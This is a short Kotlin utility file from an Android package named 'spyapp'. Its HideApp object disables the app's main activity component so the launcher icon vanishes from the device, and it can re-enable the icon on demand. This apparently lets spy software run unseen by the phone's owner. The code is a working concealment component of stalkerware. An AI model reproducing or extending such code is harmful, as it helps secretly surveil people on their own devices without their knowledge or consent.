package com.spyapp.utils

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import com.spyapp.MainActivity

object HideApp {

    fun hide(context: Context) {
        try {
            val pm = context.packageManager
            val component = ComponentName(context, MainActivity::class.java)

            pm.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun show(context: Context) {
        try {
            val pm = context.packageManager
            val component = ComponentName(context, MainActivity::class.java)

            pm.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
